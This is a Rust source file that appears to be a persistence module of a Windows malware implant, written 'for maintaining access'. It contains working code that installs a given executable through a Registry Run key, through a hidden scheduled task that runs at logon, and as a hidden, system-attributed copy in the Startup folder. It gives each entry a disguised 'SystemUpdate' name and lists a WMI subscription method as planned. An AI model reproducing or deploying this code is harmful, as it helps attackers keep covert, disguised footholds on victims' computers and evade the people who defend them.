// Persistence Mechanisms
// Implements various persistence techniques for maintaining access

use winapi::um::winreg::*;
use winapi::um::winuser::*;
use winapi::um::winbase::*;
use winapi::shared::minwindef::*;
use winapi::um::fileapi::*;
use winapi::um::shlobj::*;
use std::ptr;
use std::ffi::CString;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;

/// Persist via Registry Run Key
pub unsafe fn persist_registry_run_key(exe_path: &str) -> Result<(), String> {
    // Generate random entry name
    let entry_name = generate_random_name();
    let entry_name_cstr = CString::new(entry_name.clone())
        .map_err(|e| format!("Failed to create CString: {}", e))?;
    let exe_path_cstr = CString::new(exe_path)
        .map_err(|e| format!("Failed to create CString: {}", e))?;
    
    let mut hkey: HKEY = ptr::null_mut();
    
    // Open HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    let run_key = CString::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run").unwrap();
    let status = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        run_key.as_ptr() as *const i8,
        0,
        KEY_WRITE,
        &mut hkey,
    );
    
    if status != ERROR_SUCCESS {
        return Err(format!("Failed to open registry key: {}", status));
    }
    
    // Set value
    let value_data = exe_path_cstr.as_bytes_with_nul();
    let status = RegSetValueExA(
        hkey,
        entry_name_cstr.as_ptr() as *const i8,
        0,
        REG_SZ,
        value_data.as_ptr() as *const u8,
        value_data.len() as u32,
    );
    
    RegCloseKey(hkey);
    
    if status != ERROR_SUCCESS {
        return Err(format!("Failed to set registry value: {}", status));
    }
    
    Ok(())
}

/// Persist via Scheduled Task
pub unsafe fn persist_scheduled_task(exe_path: &str) -> Result<(), String> {
    // Generate random task name
    let task_name = generate_random_name();
    
    // Use schtasks.exe to create task
    let command = format!(
        "schtasks /create /tn \"{}\" /tr \"{}\" /sc onlogon /f",
        task_name, exe_path
    );
    
    let command_cstr = CString::new(command).unwrap();
    
    // Execute via WinExec (simpler than CreateProcess)
    let result = WinExec(command_cstr.as_ptr() as *const i8, SW_HIDE);
    
    if result < 32 {
        return Err(format!("Failed to create scheduled task: {}", result));
    }
    
    Ok(())
}

/// Persist via Startup Folder
pub unsafe fn persist_startup_folder(exe_path: &str) -> Result<(), String> {
    // Get startup folder path
    let mut startup_path = [0u16; MAX_PATH];
    let result = SHGetSpecialFolderPathW(
        ptr::null_mut(),
        startup_path.as_mut_ptr(),
        CSIDL_STARTUP,
        0,
    );
    
    if result == 0 {
        return Err("Failed to get startup folder path".to_string());
    }
    
    // Convert to string
    let startup_path_str = String::from_utf16_lossy(
        &startup_path.iter()
            .take_while(|&&c| c != 0)
            .copied()
            .collect::<Vec<u16>>()
    );
    
    // Generate random filename
    let random_name = generate_random_name();
    let target_path = format!("{}\\{}.exe", startup_path_str, random_name);
    
    // Copy executable to startup folder
    let source_cstr = CString::new(exe_path).unwrap();
    let target_cstr = CString::new(target_path.clone()).unwrap();
    
    let result = CopyFileA(
        source_cstr.as_ptr() as *const i8,
        target_cstr.as_ptr() as *const i8,
        0, // Fail if exists
    );
    
    if result == 0 {
        return Err("Failed to copy file to startup folder".to_string());
    }
    
    // Set hidden attribute
    let target_wide: Vec<u16> = OsStr::new(&target_path)
        .encode_wide()
        .chain(Some(0).into_iter())
        .collect();
    
    SetFileAttributesW(
        target_wide.as_ptr(),
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
    );
    
    Ok(())
}

/// Persist via WMI Event Subscription (Advanced)
/// 
/// ⚠️ **PENDING IMPLEMENTATION**
/// WMI event subscription requires complex COM implementation.
/// Marked as pending - other persistence methods (Registry, Scheduled Task, Startup Folder) are fully functional.
/// 
/// Planned implementation:
/// 1. Use IWbemServices COM interface
/// 2. Create event filter (e.g., process creation events)
/// 3. Create event consumer (executes payload)
/// 4. Bind filter to consumer
pub unsafe fn persist_wmi_event() -> Result<(), String> {
    // WMI event subscription is complex and requires COM
    // For now, return error - can be implemented later if needed
    Err("WMI event subscription not yet implemented - requires COM interface implementation".to_string())
}

/// Generate random name for persistence entries
fn generate_random_name() -> String {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    use std::time::{SystemTime, UNIX_EPOCH};
    
    let mut hasher = DefaultHasher::new();
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos()
        .hash(&mut hasher);
    
    let hash = hasher.finish();
    format!("SystemUpdate{:x}", hash & 0xFFFFFFFF)
}

/// Execute persistence based on method
pub unsafe fn execute_persistence(method: &str, exe_path: &str) -> Result<(), String> {
    match method {
        "registry" => persist_registry_run_key(exe_path),
        "task" => persist_scheduled_task(exe_path),
        "startup" => persist_startup_folder(exe_path),
        "wmi" => persist_wmi_event(),
        _ => Err(format!("Unknown persistence method: {}", method)),
    }
}
